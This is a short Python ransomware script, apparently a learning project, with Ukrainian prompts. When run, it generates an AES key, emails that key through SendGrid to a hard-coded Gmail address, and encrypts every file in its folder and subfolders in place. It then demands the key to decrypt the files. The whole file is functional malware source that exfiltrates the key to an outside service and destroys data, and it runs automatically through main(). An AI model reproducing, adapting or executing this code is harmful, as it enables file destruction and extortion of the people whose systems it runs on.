import base64
import os
from base64 import b64encode
from Crypto.Cipher import AES
from base64 import b64decode
from Crypto.Random import get_random_bytes
from sendgrid import SendGridAPIClient
from sendgrid.helpers.mail import Mail


def send_email(key):
    message = Mail(
        from_email='yargoryar@gmail.com',
        to_emails='yaryna.gorodietska@gmail.com',
        subject='b64_key',
        html_content=key
    )

    sg = SendGridAPIClient(os.environ.get('SENDGRID_API_KEY'))
    response = sg.send(message)


def test_encryption_on_one_word():
    data = b"YARYNA"
    key = get_random_bytes(16)
    cipher = AES.new(key, AES.MODE_OFB)
    ct_bytes = cipher.encrypt(data)
    print(ct_bytes)
    iv = b64encode(cipher.iv).decode('utf-8')
    try:
        iv = b64decode(iv)
        cipher = AES.new(key, AES.MODE_OFB, iv=iv)
        pt = cipher.decrypt(ct_bytes)
        print("The message was: ", pt)
    except (ValueError, KeyError):
        print("Incorrect decryption")


def encryption(key, iv):
    ransomware_path = os.path.realpath(__file__)
    folder_path = os.path.dirname(os.path.abspath(__file__))
    list_of_encrypted_files = []
    for root, dirs, files in os.walk(folder_path):
        for a_file in files:
            full_file_path=f"{root}\\{a_file}"
            if full_file_path != ransomware_path:
                file = open(full_file_path,"rb")
                data = file.read()
                file.close()
                file = open(full_file_path,"wb")
                cipher = AES.new(key, AES.MODE_OFB, iv=iv)
                encr = cipher.encrypt(data)
                list_of_encrypted_files.append(a_file)
                file.write(encr)
                file.close()
    print("Увага!")
    print(f"Файли у {folder_path} і підпапках були зашифровані!")
    print(list_of_encrypted_files)


def decryption(iv):
    ui_key = input("Введіть ключ, щоб розшифрувати всі файли:")
    dkey=base64.b64decode(ui_key)
    try:
        ransomware_path = os.path.realpath(__file__)
        folder_path = os.path.dirname(os.path.abspath(__file__))
        for root,dirs,files in os.walk(folder_path):
            for a_file in files:
                full_file_path=f"{root}\\{a_file}"
                if full_file_path != ransomware_path:
                    file=open(full_file_path,"rb")
                    e_data=file.read()
                    file.close()
                    file=open(full_file_path,"wb")
                    d_cipher = AES.new(dkey, AES.MODE_OFB, iv=iv)
                    decr = d_cipher.decrypt(e_data)
                    file.write(decr)
                    file.close()
        print(f"Файли {folder_path} і підпапках були розшифровані!")
    except (ValueError, KeyError):
        print("Розшифрування не відбулось!Ви ввели неправильний ключ!")


def main():
    key = get_random_bytes(16)
    b64_key = base64.b64encode(key).decode()
    send_email(b64_key)
    cipher = AES.new(key, AES.MODE_OFB)
    iv = cipher.iv
    encryption(key, iv)
    decryption(iv)


main()



